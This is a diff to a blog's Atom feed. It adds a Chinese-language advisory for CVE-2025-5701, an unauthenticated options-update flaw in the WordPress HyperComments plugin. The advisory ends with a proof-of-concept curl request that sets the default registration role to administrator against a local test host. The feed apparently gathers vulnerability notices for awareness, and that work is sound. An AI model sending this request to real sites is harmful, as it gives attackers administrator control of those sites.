@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-12T08:30:19.500Z</updated>
+  <updated>2025-06-12T08:45:15.988Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HyperComments 未授权任意选项更新漏洞</title>
+    <link href="http://example.com/2025/06/12/github_1646945798/"/>
+    <id>http://example.com/2025/06/12/github_1646945798/</id>
+    <published>2025-06-12T08:45:15.994Z</published>
+    <updated>2025-06-12T08:45:15.988Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> HyperComments 未授权任意选项更新漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5701</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> WordPress的HyperComments插件在所有版本至1.2.2中，由于对hc_request_handler函数缺少能力检查，容易受到未经授权的数据修改，从而导致权限提升。这使得未经认证的攻击者能够更新WordPress站点上的任意选项。攻击者可以利用此漏洞将注册的默认角色更新为管理员，并启用用户注册，从而获得对易受攻击站点的管理用户访问权限。</p><p><strong>产品厂商：</strong> HyperComments</p><p><strong>产品名称：</strong> HyperComments</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.2.2</p><p><strong>来源：</strong> <a href="https://github.com/RandomRobbieBF/CVE-2025-5701">https://github.com/RandomRobbieBF/CVE-2025-5701</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-5701"><a href="#CVE-2025-5701" class="headerlink" title="CVE-2025-5701"></a>CVE-2025-5701</h2><p>HyperComments &lt;&#x3D; 1.2.2 - Unauthenticated (Subscriber+) Arbitrary Options Update</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The HyperComments plugin for WordPress is vulnerable to unauthorized modification of data that can lead to privilege escalation due to a missing capability check on the hc_request_handler function in all versions up to, and including, 1.2.2. This makes it possible for unauthenticated attackers to update arbitrary options on the WordPress site. This can be leveraged to update the default role for registration to administrator and enable user registration for attackers to gain administrative user access to a vulnerable site.</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ul><li><strong>Type</strong>: plugin</li><li><strong>Slug</strong>: hypercomments</li><li><strong>Affected Version</strong>: 1.2.2</li><li><strong>CVSS Score</strong>: 9.8</li><li><strong>CVSS Rating</strong>: Critical</li><li><strong>CVSS Vector</strong>: CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</li><li><strong>CVE</strong>: CVE-2025-5701</li><li><strong>Status</strong>: Closed</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">curl -X POST <span class="hljs-string">&quot;http://kubernetes.docker.internal:8999/?hc_action=update_options&quot;</span> \<br>  -d <span class="hljs-string">&quot;data=&#123;<span class="hljs-subst">\&quot;</span>users_can_register<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>1<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>default_role<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>administrator<span class="hljs-subst">\&quot;</span>&#125;&quot;</span> \<br>  -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">curl -X POST <span class="hljs-string">&quot;http://kubernetes.docker.internal:8999/?hc_action=update_options&quot;</span> \<br>  -d <span class="hljs-string">&quot;data=&#123;<span class="hljs-subst">\&quot;</span>users_can_register<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>1<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>users_can_register<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>1<span class="hljs-subst">\&quot;</span>&#125;&quot;</span> \<br>  -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; HyperComments 未授权任意选项更新漏洞&lt;/p&gt;
+&lt;p&gt;&lt;stron</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
   
   <entry>
     <title>HTTP Protocol Stack 远程代码执行漏洞</title>
@@ -518,33 +545,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>独眼情报社群10正式版介绍</title>
-    <link href="http://example.com/2025/06/12/weixin_2785261893/"/>
-    <id>http://example.com/2025/06/12/weixin_2785261893/</id>
-    <published>2025-06-12T07:03:09.814Z</published>
-    <updated>2025-06-12T07:03:09.810Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ho-LnD4QKg9Oz_F0Y1nMOA">https://mp.weixin.qq.com/s/ho-LnD4QKg9Oz_F0Y1nMOA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ho-LnD4QKg9Oz_F0Y1nMOA&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
     
   </entry>
   
